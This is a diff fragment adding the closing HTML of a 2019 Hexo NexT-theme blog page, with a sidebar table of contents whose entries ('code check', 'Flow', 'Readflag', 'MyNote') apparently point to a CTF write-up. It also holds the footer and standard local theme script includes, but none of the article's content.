+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#code-check"><span class="nav-number">1.</span> <span class="nav-text">code check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flow"><span class="nav-number">2.</span> <span class="nav-text">Flow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Readflag"><span class="nav-number">3.</span> <span class="nav-text">Readflag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MyNote"><span class="nav-number">4.</span> <span class="nav-text">MyNote</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
